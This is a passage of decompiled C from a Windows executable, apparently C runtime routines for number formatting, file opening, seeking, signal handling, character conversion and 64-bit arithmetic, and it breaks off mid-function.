int __cdecl sub_4091A0(_WORD *a1)
{
  return (__int16)sub_40A440(a1);
}

//----- (004091B0) --------------------------------------------------------
_BYTE *__cdecl sub_4091B0(int a1, char a2)
{
  _BYTE *v3; // edx
  _BYTE *v4; // edx
  double v5; // st7
  char *v6; // eax
  char *v7; // eax
  int v8; // eax
  char v9; // dl
  char v10; // [esp+0h] [ebp-64h]
  int v11; // [esp+4h] [ebp-60h]
  int v12; // [esp+8h] [ebp-5Ch]
  int v13; // [esp+8h] [ebp-5Ch]
  int i; // [esp+8h] [ebp-5Ch]
  char v15; // [esp+8h] [ebp-5Ch]
  int v16; // [esp+Ch] [ebp-58h]
  int v17; // [esp+14h] [ebp-50h]
  double v18; // [esp+14h] [ebp-50h]
  int v19; // [esp+14h] [ebp-50h]
  _BOOL2 v20; // [esp+14h] [ebp-50h]
  const char *v21; // [esp+18h] [ebp-4Ch]
  int v22; // [esp+18h] [ebp-4Ch]
  __int16 v23; // [esp+18h] [ebp-4Ch]
  int v24; // [esp+1Ch] [ebp-48h]
  int v25; // [esp+1Ch] [ebp-48h]
  int v26; // [esp+1Ch] [ebp-48h]
  int v27; // [esp+20h] [ebp-44h]
  int v28; // [esp+20h] [ebp-44h]
  int v29; // [esp+20h] [ebp-44h]
  int v30; // [esp+20h] [ebp-44h]
  int v31; // [esp+20h] [ebp-44h]
  int v32; // [esp+20h] [ebp-44h]
  char v33; // [esp+26h] [ebp-3Eh] BYREF
  char v34[39]; // [esp+27h] [ebp-3Dh] BYREF
  __int16 v35; // [esp+4Eh] [ebp-16h]
  __int16 v36; // [esp+50h] [ebp-14h] BYREF
  __int16 v37; // [esp+52h] [ebp-12h]
  double v38; // [esp+54h] [ebp-10h] BYREF
  char *v39; // [esp+60h] [ebp-4h]

  v39 = &v33;
  v38 = *(double *)a1;
  if ( a2 != 97 && a2 != 65 )
  {
    if ( *(int *)(a1 + 44) >= 0 )
    {
      if ( !*(_DWORD *)(a1 + 44) && (a2 == 103 || a2 == 71) )
        *(_DWORD *)(a1 + 44) = 1;
    }
    else
    {
      *(_DWORD *)(a1 + 44) = 6;
    }
  }
  v35 = sub_40A4B0(&v36, (unsigned __int16 *)a1);
  if ( v35 == 2 )
  {
    *(_DWORD *)(a1 + 28) = 3;
    if ( a2 == 97 || a2 == 101 || a2 == 102 || a2 == 103 )
      return sub_404EE0(*(_BYTE **)(a1 + 16), (_BYTE *)&dword_412438 + 2, 3);
    else
      return sub_404EE0(*(_BYTE **)(a1 + 16), byte_412436, 3);
  }
  else if ( v35 <= 0 )
  {
    if ( a2 == 97 || a2 == 65 )
    {
      v3 = *(_BYTE **)(a1 + 16);
      *(_DWORD *)(a1 + 16) = v3 + 1;
      *v3 = 48;
      v4 = *(_BYTE **)(a1 + 16);
      *(_DWORD *)(a1 + 16) = v4 + 1;
      *v4 = a2 != 97 ? 88 : 120;
      *(_DWORD *)(a1 + 20) += 2;
    }
    if ( v35 )
    {
      if ( a2 == 97 || a2 == 65 )
      {
        if ( a2 == 97 )
          v21 = "0123456789abcdef";
        else
          v21 = "0123456789ABCDEF";
        if ( *(int *)(a1 + 44) >= 0 )
          v17 = *(_DWORD *)(a1 + 44) + 1;
        else
          LOWORD(v17) = 33;
        v37 = v17;
        v27 = (__int16)v17 + 1;
        if ( v38 >= 0.0 )
          v5 = *(double *)a1;
        else
          v5 = -*(double *)a1;
        v38 = v5;
        v36 -= 4;
        v6 = v39++;
        *v6 = 0;
        while ( v27 > 0 && v38 > 0.0 )
        {
          sub_40A4D0((unsigned __int16 *)&v38, 28);
          v12 = sub_40A4F0(v38);
          v27 -= 7;
          if ( v27 > 0 )
            v38 = v38 - (double)v12;
          v39 += 7;
          v11 = 7;
          while ( v12 > 0 )
          {
            if ( --v11 < 0 )
              break;
            *--v39 = v12 & 0xF;
            v12 >>= 4;
          }
          while ( --v11 >= 0 )
            *--v39 = 0;
          v39 += 7;
        }
        v28 = v39 - v34;
        v39 = v34;
        if ( v28 < v37 )
          v37 = v28;
        if ( v37 >= 0 )
        {
          if ( v37 >= v28 || (unsigned __int8)v39[v37] < 8u )
            v10 = 0;
          else
            v10 = 15;
          v13 = v37;
          while ( v39[--v13] == v10 )
            --v37;
          if ( v10 == 15 )
            ++v39[v13];
          if ( v13 < 0 )
          {
            --v39;
            ++v37;
            v36 += 4;
          }
          for ( i = v37; --i >= 0; v39[i] = v21[(unsigned __int8)v39[i]] )
            ;
        }
        if ( *(int *)(a1 + 44) < 0 )
          *(_DWORD *)(a1 + 44) = v37 - 1;
      }
      else
      {
        if ( v38 < 0.0 )
          v38 = -v38;
        v36 = 30103 * v36 / 100000 - 4;
        if ( v36 >= 0 )
        {
          if ( v36 > 0 )
          {
            v18 = 1.0;
            v36 &= 0xFFFCu;
            v30 = v36;
            v25 = 0;
            while ( v30 > 0 )
            {
              if ( (v30 & 1) != 0 )
                v18 = v18 * dbl_4123AC[v25];
              v30 >>= 1;
              ++v25;
            }
            v38 = v38 / v18;
          }
        }
        else
        {
          v29 = (3 - v36) & 0xFFFFFFFC;
          v36 = -(__int16)v29;
          v24 = 0;
          while ( v29 > 0 )
          {
            if ( (v29 & 1) != 0 )
              v38 = v38 * dbl_4123AC[v24];
            v29 >>= 1;
            ++v24;
          }
        }
        if ( a2 == 102 || a2 == 70 )
          v26 = v36 + 10;
        else
          v26 = 6;
        v31 = *(_DWORD *)(a1 + 44) + v26;
        if ( v31 > 19 )
          v31 = 19;
        v7 = v39++;
        *v7 = 48;
        while ( v31 > 0 && v38 > 0.0 )
        {
          v22 = sub_40A4F0(v38);
          v31 -= 8;
          if ( v31 > 0 )
            v38 = (v38 - (double)v22) * 100000000.0;
          v39 += 8;
          v19 = 8;
          while ( v22 > 0 )
          {
            if ( --v19 < 0 )
              break;
            v8 = sub_40A520(v22, 10);
            *--v39 = v9 + 48;
            v22 = v8;
          }
          while ( --v19 >= 0 )
            *--v39 = 48;
          v39 += 8;
        }
        v32 = v39 - v34;
        v39 = v34;
        v36 += 7;
        while ( *v39 == 48 )
        {
          --v32;
          --v36;
          ++v39;
        }
        if ( a2 == 102 || a2 == 70 )
        {
          v23 = v36 + 1;
        }
        else
        {
          v20 = a2 == 101 || a2 == 69;
          v23 = v20;
        }
        v37 = *(_DWORD *)(a1 + 44) + v23;
        if ( v32 < v37 )
          v37 = v32;
        if ( v37 >= 0 )
        {
          if ( v37 >= v32 || (unsigned __int8)v39[v37] < 0x35u )
            v15 = 48;
          else
            v15 = 57;
          v16 = v37;
          while ( v39[--v16] == v15 )
            --v37;
          if ( v15 == 57 )
            ++v39[v16];
          if ( v16 < 0 )
          {
            --v39;
            ++v37;
            ++v36;
          }
        }
      }
    }
    else
    {
      v37 = 0;
      v36 = 0;
    }
    return (_BYTE *)sub_40A550(a1, a2, v39, v37, v36);
  }
  else
  {
    *(_DWORD *)(a1 + 28) = 3;
    if ( a2 == 97 || a2 == 101 || a2 == 102 || a2 == 103 )
      return sub_404EE0(*(_BYTE **)(a1 + 16), "inf", 3);
    else
      return sub_404EE0(*(_BYTE **)(a1 + 16), "INF", 3);
  }
}
// 4096D6: variable 'v9' is possibly undefined
// 4123AC: using guessed type double dbl_4123AC[9];
// 412436: using guessed type _BYTE byte_412436[2];
// 412438: using guessed type int dword_412438;
// 4091B0: using guessed type double var_10;

//----- (00409850) --------------------------------------------------------
int __usercall sub_409850@<eax>(int a1@<esi>, const CHAR *a2, __int16 a3, int a4)
{
  return sub_409880(a2, a3, 64, a4, a1);
}
// 409850: could not find valid save-restore pair for esi

//----- (00409880) --------------------------------------------------------
int __cdecl sub_409880(const CHAR *a1, __int16 a2, int a3, int a4, int a5)
{
  int v5; // edi
  int v7; // eax
  int v8; // esi
  int LastError; // eax
  int v10; // eax
  _BYTE *v11; // eax
  char v12; // [esp-35h] [ebp-39h] BYREF
  LONG v13; // [esp-34h] [ebp-38h]
  int v14; // [esp-30h] [ebp-34h]
  int *v15; // [esp-2Ch] [ebp-30h]
  DWORD v16; // [esp-28h] [ebp-2Ch]
  DWORD v17; // [esp-24h] [ebp-28h]
  DWORD v18; // [esp-20h] [ebp-24h]
  DWORD FileType; // [esp-1Ch] [ebp-20h]
  HANDLE v20; // [esp-18h] [ebp-1Ch]
  DWORD v21; // [esp-14h] [ebp-18h]
  struct _SECURITY_ATTRIBUTES v22; // [esp-10h] [ebp-14h] BYREF
  char v23; // [esp-1h] [ebp-5h]

  v22.nLength = 12;
  v22.lpSecurityDescriptor = 0;
  if ( (a2 & 0x80) != 0 )
  {
    v22.bInheritHandle = 0;
    v23 = 16;
  }
  else
  {
    v22.bInheritHandle = 1;
    v23 = 0;
  }
  if ( (a2 & 0x8000) == 0 && (a2 & 0x4000) != 0 )
    v23 |= 0x80u;
  v5 = a2 & 3;
  if ( (a2 & 3) != 0 )
  {
    if ( v5 == 1 )
    {
      v18 = 0x40000000;
    }
    else
    {
      if ( v5 != 2 )
      {
        dword_415C84 = 22;
        return -1;
      }
      v18 = -1073741824;
    }
  }
  else
  {
    v18 = 0x80000000;
  }
  if ( a3 == 32 )
  {
    v16 = 1;
  }
  else if ( a3 > 32 )
  {
    if ( a3 == 48 )
    {
      v16 = 2;
    }
    else
    {
      if ( a3 != 64 )
        goto LABEL_25;
      v16 = 3;
    }
  }
  else
  {
    if ( a3 != 16 )
    {
LABEL_25:
      dword_415C84 = 22;
      return -1;
    }
    v16 = 0;
  }
  v7 = a2 & 0x700;
  if ( v7 == 768 )
  {
    v17 = 2;
    goto LABEL_47;
  }
  if ( (a2 & 0x700u) <= 0x300 )
  {
    if ( v7 == 256 )
    {
      v17 = 4;
      goto LABEL_47;
    }
    if ( (a2 & 0x700u) <= 0x100 )
    {
      if ( (a2 & 0x700) != 0 )
      {
LABEL_46:
        dword_415C84 = 22;
        return -1;
      }
      goto LABEL_41;
    }
    if ( v7 != 512 )
      goto LABEL_46;
LABEL_44:
    v17 = 5;
    goto LABEL_47;
  }
  if ( v7 == 1280 )
  {
LABEL_43:
    v17 = 1;
    goto LABEL_47;
  }
  if ( (a2 & 0x700u) > 0x500 )
  {
    if ( v7 == 1536 )
      goto LABEL_44;
    if ( v7 != 1792 )
      goto LABEL_46;
    goto LABEL_43;
  }
  if ( v7 != 1024 )
    goto LABEL_46;
LABEL_41:
  v17 = 3;
LABEL_47:
  v21 = 128;
  if ( (a2 & 0x100) != 0 )
  {
    v15 = &a5;
    v14 = a4;
    if ( (a4 & 0x80u) == 0 )
      v21 = 1;
  }
  if ( (a2 & 0x40) != 0 )
  {
    v21 |= 0x4000000u;
    v18 |= 0x10000u;
  }
  if ( (a2 & 0x1000) != 0 )
    v21 |= 0x100u;
  if ( (a2 & 0x20) != 0 )
  {
    v21 |= 0x8000000u;
  }
  else if ( (a2 & 0x10) != 0 )
  {
    v21 |= 0x10000000u;
  }
  v8 = sub_4088F0();
  if ( v8 == -1 )
  {
    dword_415C84 = 24;
    return -1;
  }
  v20 = CreateFileA(a1, v18, v16, &v22, v17, v21, 0);
  if ( v20 == (HANDLE)-1 )
  {
    LastError = GetLastError();
    sub_408C30(LastError);
    return -1;
  }
  FileType = GetFileType(v20);
  switch ( FileType )
  {
    case 0u:
      CloseHandle(v20);
      v10 = GetLastError();
      sub_408C30(v10);
      return -1;
    case 2u:
      v23 |= 0x40u;
      break;
    case 3u:
      v23 |= 8u;
      break;
  }
  sub_408A60(v8, v20);
  v23 |= 1u;
  *((_BYTE *)*(&lpMem + (v8 >> 5)) + 8 * (v8 & 0x1F) + 4) = v23;
  if ( (v23 & 0x48) == 0 && (v23 & 0x80) != 0 && (a2 & 2) != 0 )
  {
    v13 = sub_409FD0(v8, -1, 2u);
    if ( v13 == -1 )
    {
      if ( GetLastError() != 131 )
      {
        sub_405CE0(v8);
        return -1;
      }
    }
    else
    {
      v12 = 0;
      if ( !sub_40AA60(v8, &v12, 1u) && v12 == 26 && sub_40ADC0(v5, v8, v8, v13) == -1
        || (v13 = sub_409FD0(v8, 0, 0), v13 == -1) )
      {
        sub_405CE0(v8);
        return -1;
      }
    }
  }
  if ( (v23 & 0x48) == 0 && (a2 & 8) != 0 )
  {
    v11 = (char *)*(&lpMem + (v8 >> 5)) + 8 * (v8 & 0x1F) + 4;
    *v11 |= 0x20u;
  }
  return v8;
}
// 415C84: using guessed type int dword_415C84;

//----- (00409C40) --------------------------------------------------------
int __cdecl sub_409C40(unsigned __int8 *a1, unsigned __int8 *a2, int a3)
{
  int v5; // ecx
  int v7; // [esp+8h] [ebp-4h]

  while ( a3 )
  {
    v5 = *((__int16 *)off_415A60 + *a1);
    v7 = *((__int16 *)off_415A60 + *a2);
    if ( v5 != v7 )
      return v5 < v7 ? -1 : 1;
    if ( !*((_WORD *)off_415A60 + *a1) )
      return 0;
    ++a1;
    ++a2;
    --a3;
  }
  return 0;
}
// 415A60: using guessed type void *off_415A60;

//----- (00409CA0) --------------------------------------------------------
int __cdecl sub_409CA0(unsigned __int8 *a1, int a2)
{
  int v4; // ecx

  v4 = 0;
  while ( --a2 >= 0 && (*((_WORD *)off_416304 + *a1) & 1) != 0 )
    v4 = *a1++ + 10 * v4 - 48;
  if ( a2 < 0 )
    return v4;
  else
    return -1;
}
// 416304: using guessed type void *off_416304;

//----- (00409CF0) --------------------------------------------------------
char *__cdecl sub_409CF0(unsigned __int8 *a1)
{
  unsigned __int8 *v1; // ebx
  char *result; // eax
  _BYTE *v3; // edi
  char v4; // di
  char *j; // esi
  int v6; // eax
  unsigned __int8 *v7; // ebx
  unsigned __int8 *v8; // ebx
  int v9; // eax
  int i; // [esp-10h] [ebp-14h]
  _BYTE *v11; // [esp-Ch] [ebp-10h]
  char v12; // [esp-Ch] [ebp-10h]
  char *v13; // [esp-8h] [ebp-Ch]
  unsigned __int8 v14; // [esp-1h] [ebp-5h]

  v1 = a1 + 1;
  v14 = *a1;
  if ( !*a1 )
    return 0;
  v3 = a1 + 1;
  for ( i = 2; ; ++i )
  {
    v11 = sub_405250(v3, v14);
    if ( !v11 )
      break;
    v3 = v11 + 1;
  }
  result = (char *)sub_403DC0(5 * i);
  v13 = result;
  if ( result )
  {
    v4 = 0;
    for ( j = result; ; j += 5 )
    {
      if ( *v1 == 40 )
      {
        v6 = sub_409CA0(v1 + 1, 4);
        v4 = v6 - 108;
        if ( v6 - 1900 < 0 || v1[5] != 41 )
          break;
        v1 += 6;
      }
      j[4] = v4;
      j[3] = sub_409CA0(v1, 2) - 1;
      v7 = v1 + 2;
      j[2] = sub_409CA0(v7, 2) - 1;
      v8 = v7 + 2;
      if ( (*((_WORD *)off_416304 + *v8) & 1) != 0 )
      {
        j[1] = sub_409CA0(v8, 2);
        v8 += 2;
      }
      else
      {
        j[1] = 0;
      }
      if ( (unsigned __int8)j[3] >= 0xCu || (unsigned __int8)j[2] > 0x63u || (unsigned __int8)j[1] > 0x63u )
        break;
      v9 = *v8;
      if ( v9 == 43 || v9 == 45 )
      {
        if ( v8[1] < 0x30u || v8[1] > 0x36u )
          break;
        v12 = v8[1] == 48 ? 7 : v8[1] - 48;
        *j = v12;
        if ( *v8 == 43 )
          *j += 7;
        v8 += 2;
      }
      else
      {
        *j = 0;
      }
      if ( !*v8 )
      {
        j[5] = -1;
        j[9] = v4;
        return v13;
      }
      if ( *v8 != v14 )
        break;
      v1 = v8 + 1;
    }
    sub_404670(v13);
    return 0;
  }
  return result;
}
// 416304: using guessed type void *off_416304;

//----- (00409E80) --------------------------------------------------------
int __cdecl sub_409E80(int a1)
{
  int v1; // eax
  void (__cdecl *v2)(int); // ebx
  char v4; // [esp-5h] [ebp-9h] BYREF
  char *v5; // [esp-4h] [ebp-8h]

  v1 = sub_404B60(a1, 1);
  v2 = (void (__cdecl *)(int))v1;
  if ( v1 == -1 )
    return -1;
  if ( v1 != 1 )
  {
    if ( !v1 )
    {
      if ( a1 < 2 )
        goto LABEL_11;
      if ( a1 <= 11 )
        __asm { jmp     ds:dword_412438[eax*4] }
      if ( a1 == 15 )
      {
        v5 = "termination request";
      }
      else
      {
LABEL_11:
        v5 = &v4;
        v4 = 0;
        do
        {
          *--v5 = a1 % 10 + 48;
          a1 /= 10;
        }
        while ( a1 );
        sub_40AF40("signal #", (int)&unk_415E54);
      }
      sub_40AF40(v5, (int)&unk_415E54);
      sub_40AF40(" -- terminating\n", (int)&unk_415E54);
      sub_404BD0(1u);
    }
    sub_404B60(a1, 0);
    v2(a1);
  }
  return 0;
}

//----- (00409FD0) --------------------------------------------------------
int __cdecl sub_409FD0(int a1, LONG a2, DWORD a3)
{
  void *v4; // eax
  DWORD v5; // esi
  int LastError; // eax
  _BYTE *v7; // eax

  if ( a1 < uNumber && (*((_BYTE *)*(&lpMem + (a1 >> 5)) + 8 * (a1 & 0x1F) + 4) & 1) != 0 )
  {
    v4 = (void *)sub_408B00(a1);
    if ( v4 == (void *)-1 )
    {
      dword_415C84 = 9;
      return -1;
    }
    else
    {
      v5 = SetFilePointer(v4, a2, 0, a3);
      if ( v5 == -1 )
      {
        LastError = GetLastError();
        sub_408C30(LastError);
        return -1;
      }
      else
      {
        v7 = (char *)*(&lpMem + (a1 >> 5)) + 8 * (a1 & 0x1F) + 4;
        *v7 &= ~2u;
        return v5;
      }
    }
  }
  else
  {
    dword_415C84 = 9;
    return -1;
  }
}
// 415C84: using guessed type int dword_415C84;

//----- (0040A080) --------------------------------------------------------
int __cdecl sub_40A080(_BYTE *a1, unsigned __int16 a2, int a3)
{
  _BYTE *v4; // eax
  int v5; // eax
  char v6; // [esp+4h] [ebp-1Ch]
  int v7; // [esp+8h] [ebp-18h]
  __int16 v8; // [esp+Eh] [ebp-12h]
  int v9; // [esp+10h] [ebp-10h]
  int v10; // [esp+14h] [ebp-Ch]
  _BYTE *v11; // [esp+18h] [ebp-8h]
  int v12; // [esp+18h] [ebp-8h]
  int v13; // [esp+1Ch] [ebp-4h]
  unsigned __int8 v14; // [esp+1Fh] [ebp-1h]

  if ( off_416394 )
  {
    v14 = *(_WORD *)(a3 + 6);
    v9 = 0;
    v10 = 0;
    v12 = 0;
    if ( a1 )
    {
      do
      {
        if ( v14 >= 0x10u
          || (v7 = (int)*(&off_4163D4 + v14)) == 0
          || v12 >= (unsigned __int8)byte_416310
          || (++v10, v10 >= 4080)
          || (v8 = *(_WORD *)(v7 + 2 * (unsigned __int8)a2)) == 0 )
        {
          dword_415C84 = 42;
          return -1;
        }
        v14 = (unsigned __int16)(v8 & 0xF00) >> 8;
        if ( (v8 & 0x8000) != 0 )
          a2 = (unsigned __int8)v8 | a2 & 0xFF00;
        if ( (v8 & 0x1000) != 0 )
          a2 = HIBYTE(a2) | (unsigned __int16)(a2 << 8);
        if ( (v8 & 0x2000) != 0 )
        {
          v5 = v12++;
          if ( (_BYTE)v8 )
            v6 = v8;
          else
            v6 = a2;
          a1[v5] = v6;
          if ( !v6 )
            v9 = 1;
          v10 = 0;
        }
      }
      while ( (v8 & 0x4000) == 0 && !v9 );
      *(_WORD *)(a3 + 6) = v14;
      return v12;
    }
    else
    {
      *(_DWORD *)a3 = 0;
      *(_DWORD *)(a3 + 4) = 0;
      return *(_WORD *)off_416394 & 0xF00;
    }
  }
  else if ( a1 )
  {
    if ( (a2 & 0xFF80) != 0 )
    {
      v11 = a1 + 1;
      if ( (a2 & 0xF800) != 0 )
      {
        *a1 = ((int)a2 >> 12) & 0xF | 0xE0;
        v13 = 2;
      }
      else
      {
        *a1 = ((int)a2 >> 6) | 0xC0;
        v13 = 1;
      }
    }
    else
    {
      v11 = a1 + 1;
      *a1 = a2;
      v13 = 0;
    }
    while ( v13 > 0 )
    {
      v4 = v11++;
      *v4 = ((int)a2 >> (6 * --v13)) & 0x3F | 0x80;
    }
    return v11 - a1;
  }
  else
  {
    *(_DWORD *)a3 = 0;
    *(_DWORD *)(a3 + 4) = 0;
    return 0;
  }
}
// 415C84: using guessed type int dword_415C84;
// 416310: using guessed type char byte_416310;
// 416394: using guessed type void *off_416394;
// 4163D4: using guessed type void *off_4163D4;

//----- (0040A2D0) --------------------------------------------------------
unsigned __int64 __stdcall sub_40A2D0(__int64 a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // rtt
  unsigned int v4; // ecx
  unsigned int v5; // ebx
  unsigned __int64 v6; // rax
  bool v7; // cf
  int v8; // ecx
  unsigned __int64 v9; // rax

  if ( HIDWORD(a1) )
  {
    v4 = HIDWORD(a1);
    v5 = a1;
    v6 = a2;
    do
    {
      v7 = v4 & 1;
      v4 >>= 1;
      v5 = (v5 >> 1) | (v7 << 31);
      v6 >>= 1;
    }
    while ( v4 );
    v8 = HIDWORD(a1) * (v6 / v5);
    v9 = (unsigned int)a1 * (unsigned __int64)(unsigned int)(v6 / v5);
    v7 = __CFADD__(v8, HIDWORD(v9));
    HIDWORD(v9) += v8;
    if ( v7 || v9 > a2 )
      v9 -= a1;
    return a2 - v9;
  }
  else
  {
    LODWORD(v2) = a2;
    HIDWORD(v2) = HIDWORD(a2) % (unsigned int)a1;
    return v2 % (unsigned int)a1;
  }
}

//----- (0040A350) --------------------------------------------------------
int __stdcall sub_40A350(__int64 a1, unsigned __int64 a2)
{
  int v2; // edi
  int v3; // eax
  unsigned __int64 v4; // rtt
  __int64 v5; // rax
  unsigned __int64 v6; // rcx
  unsigned __int64 v7; // rax
  unsigned int v8; // esi
  unsigned __int64 v9; // rax

  v2 = 0;
  if ( (a2 & 0x8000000000000000ui64) != 0i64 )
  {
    v2 = 1;
    HIDWORD(a2) = -HIDWORD(a2) - ((_DWORD)a2 != 0);
    LODWORD(a2) = -(int)a2;
  }
  v3 = HIDWORD(a1);
  if ( a1 < 0 )
  {
    ++v2;
    v3 = -HIDWORD(a1) - ((_DWORD)a1 != 0);
    HIDWORD(a1) = v3;
    LODWORD(a1) = -(int)a1;
  }
  if ( v3 )
  {
    v6 = __PAIR64__(v3, a1);
    v7 = a2;
    do
    {
      v6 >>= 1;
      v7 >>= 1;
    }
    while ( HIDWORD(v6) );
    v8 = v7 / (unsigned int)v6;
    v9 = v8 * (unsigned __int64)(unsigned int)a1;
    if ( __CFADD__(HIDWORD(a1) * v8, HIDWORD(v9)) || (HIDWORD(v9) = (a1 * (unsigned __int64)v8) >> 32, v9 > a2) )
      --v8;
    v5 = v8;
  }
  else
  {
    LODWORD(v4) = a2;
    HIDWORD(v4) = HIDWORD(a2) % (unsigned int)a1;
    LODWORD(v5) = v4 / (unsigned int)a1;
    HIDWORD(v5) = HIDWORD(a2) / (unsigned int)a1;
  }
  if ( v2 == 1 )
    return -v5;
  return v5;
}

//----- (0040A400) --------------------------------------------------------
unsigned __int64 __stdcall sub_40A400(__int64 a1, __int64 a2)
{
  if ( HIDWORD(a2) | HIDWORD(a1) )
    return a2 * a1;
  else
    return (unsigned int)a1 * (unsigned __int64)(unsigned int)a2;
}

//----- (0040A440) --------------------------------------------------------
int __cdecl sub_40A440(_WORD *a1)
{
  if ( (a1[3] & 0x7FF0) == 32752 )
  {
    if ( (a1[3] & 0xF) != 0 || a1[2] || a1[1] || *a1 )
      return 2;
    else
      return 1;
  }
  else if ( (a1[3] & 0x7FFF) != 0 || a1[2] || a1[1] || *a1 )
  {
    return -1;
  }
  else
  {
    return 0;
  }
}

//----- (0040A4B0) --------------------------------------------------------
int __cdecl sub_40A4B0(_WORD *a1, unsigned __int16 *a2)
{
  return (__int16)sub_40B040(a1, a2);
}

//----- (0040A4D0) --------------------------------------------------------
int __cdecl sub_40A4D0(unsigned __int16 *a1, int a2)
{
  return (__int16)sub_40B0E0(a1, a2);
}

//----- (0040A4F0) --------------------------------------------------------
__int64 __usercall sub_40A4F0@<edx:eax>(double a1@<st0>)
{
  return (__int64)a1;
}

//----- (0040A520) --------------------------------------------------------
int __cdecl sub_40A520(int a1, int a2)
{
  return a1 / a2;
}

//----- (0040A550) --------------------------------------------------------
int __cdecl sub_40A550(int a1, char a2, _BYTE *a3, __int16 a4, __int16 a5)
{
  int v5; // edx
  int v6; // edx
  int v7; // edx
  int v8; // edx
  int v9; // edx
  int v10; // edx
  _BYTE *v11; // eax
  int v12; // edx
  char *v13; // eax
  _BYTE *v14; // eax
  char v15; // dl
  _BYTE *v16; // eax
  _BYTE *v17; // eax
  _BYTE *v18; // eax
  int result; // eax
  __int16 v20; // [esp-1Ch] [ebp-20h]
  _BYTE v21[10]; // [esp-12h] [ebp-16h]
  int v22; // [esp-8h] [ebp-Ch]
  char v23; // [esp-1h] [ebp-5h]
  _BYTE *v24; // [esp+10h] [ebp+Ch]
  _BYTE *v25; // [esp+10h] [ebp+Ch]
  __int16 v26; // [esp+14h] [ebp+10h]
  __int16 v27; // [esp+14h] [ebp+10h]
  __int16 v28; // [esp+18h] [ebp+14h]

  v23 = *(_BYTE *)off_416440;
  if ( a4 <= 0 )
  {
    a4 = 1;
    a3 = &unk_4124F8;
  }
  if ( a2 == 102 || a2 == 70 || (a2 == 103 || a2 == 71) && a5 >= -4 && a5 < *(_DWORD *)(a1 + 44) )
  {
    v28 = a5 + 1;
    if ( a2 == 103 || a2 == 71 )
    {
      if ( (*(_WORD *)(a1 + 56) & 8) == 0 && a4 < *(_DWORD *)(a1 + 44) )
        *(_DWORD *)(a1 + 44) = a4;
      v5 = *(_DWORD *)(a1 + 44) - v28;
      *(_DWORD *)(a1 + 44) = v5;
      if ( v5 < 0 )
        *(_DWORD *)(a1 + 44) = 0;
    }
    if ( v28 > 0 )
    {
      if ( a4 >= v28 )
      {
        sub_404EE0((_BYTE *)(*(_DWORD *)(a1 + 28) + *(_DWORD *)(a1 + 16)), a3, v28);
        *(_DWORD *)(a1 + 28) += v28;
        v26 = a4 - v28;
        if ( *(int *)(a1 + 44) > 0 || (*(_WORD *)(a1 + 56) & 8) != 0 )
        {
          v8 = *(_DWORD *)(a1 + 28);
          *(_DWORD *)(a1 + 28) = v8 + 1;
          *(_BYTE *)(*(_DWORD *)(a1 + 16) + v8) = v23;
        }
        if ( *(_DWORD *)(a1 + 44) < v26 )
          v26 = *(_DWORD *)(a1 + 44);
        sub_404EE0((_BYTE *)(*(_DWORD *)(a1 + 28) + *(_DWORD *)(a1 + 16)), &a3[v28], v26);
        *(_DWORD *)(a1 + 28) += v26;
        *(_DWORD *)(a1 + 32) = *(_DWORD *)(a1 + 44) - v26;
      }
      else
      {
        sub_404EE0((_BYTE *)(*(_DWORD *)(a1 + 28) + *(_DWORD *)(a1 + 16)), a3, a4);
        *(_DWORD *)(a1 + 28) += a4;
        *(_DWORD *)(a1 + 32) = v28 - a4;
        if ( *(int *)(a1 + 44) > 0 || (*(_WORD *)(a1 + 56) & 8) != 0 )
        {
          *(_BYTE *)(*(_DWORD *)(a1 + 16) + *(_DWORD *)(a1 + 28)) = v23;
          ++*(_DWORD *)(a1 + 36);
        }
        *(_DWORD *)(a1 + 40) = *(_DWORD *)(a1 + 44);
      }
    }
    else
    {
      v6 = *(_DWORD *)(a1 + 28);
      *(_DWORD *)(a1 + 28) = v6 + 1;
      *(_BYTE *)(*(_DWORD *)(a1 + 16) + v6) = 48;
      if ( *(int *)(a1 + 44) > 0 || (*(_WORD *)(a1 + 56) & 8) != 0 )
      {
        v7 = *(_DWORD *)(a1 + 28);
        *(_DWORD *)(a1 + 28) = v7 + 1;
        *(_BYTE *)(*(_DWORD *)(a1 + 16) + v7) = v23;
      }
      if ( *(_DWORD *)(a1 + 44) < -v28 )
        v28 = -*(_WORD *)(a1 + 44);
      *(_DWORD *)(a1 + 32) = -v28;
      *(_DWORD *)(a1 + 44) += v28;
      if ( *(_DWORD *)(a1 + 44) < a4 )
        a4 = *(_DWORD *)(a1 + 44);
      *(_DWORD *)(a1 + 36) = a4;
      sub_404EE0((_BYTE *)(*(_DWORD *)(a1 + 28) + *(_DWORD *)(a1 + 16)), a3, a4);
      *(_DWORD *)(a1 + 40) = *(_DWORD *)(a1 + 44) - a4;
    }
  }
  else
  {
    switch ( a2 )
    {
      case 'g':
      case 'G':
        if ( a4 < *(_DWORD *)(a1 + 44) && (*(_WORD *)(a1 + 56) & 8) == 0 )
          *(_DWORD *)(a1 + 44) = a4;
        v9 = *(_DWORD *)(a1 + 44) - 1;
        *(_DWORD *)(a1 + 44) = v9;
        if ( v9 < 0 )
          *(_DWORD *)(a1 + 44) = 0;
        a2 = a2 != 103 ? 69 : 101;
        break;
      case 'a':
        a2 = 112;
        break;
      case 'A':
        a2 = 80;
        break;
    }
    v10 = *(_DWORD *)(a1 + 28);
    *(_DWORD *)(a1 + 28) = v10 + 1;
    v11 = a3;
    v24 = a3 + 1;
    *(_BYTE *)(*(_DWORD *)(a1 + 16) + v10) = *v11;
    if ( *(int *)(a1 + 44) > 0 || (*(_WORD *)(a1 + 56) & 8) != 0 )
    {
      v12 = *(_DWORD *)(a1 + 28);
      *(_DWORD *)(a1 + 28) = v12 + 1;
      *(_BYTE *)(*(_DWORD *)(a1 + 16) + v12) = v23;
    }
    if ( *(int *)(a1 + 44) > 0 )
    {
      v27 = a4 - 1;
      if ( *(_DWORD *)(a1 + 44) < v27 )
        v27 = *(_DWORD *)(a1 + 44);
      sub_404EE0((_BYTE *)(*(_DWORD *)(a1 + 28) + *(_DWORD *)(a1 + 16)), v24, v27);
      *(_DWORD *)(a1 + 28) += v27;
      *(_DWORD *)(a1 + 32) = *(_DWORD *)(a1 + 44) - v27;
    }
    v13 = (char *)(*(_DWORD *)(a1 + 28) + *(_DWORD *)(a1 + 16));
    *v13 = a2;
    v14 = v13 + 1;
    v25 = v14 + 1;
    if ( a5 < 0 )
    {
      *v14 = 45;
      a5 = -a5;
    }
    else
    {
      *v14 = 43;
    }
    v22 = 0;
    while ( a5 > 0 )
    {
      v20 = sub_40B300(a5, 10);
      v21[v22] = v15;
      a5 = v20;
      ++v22;
    }
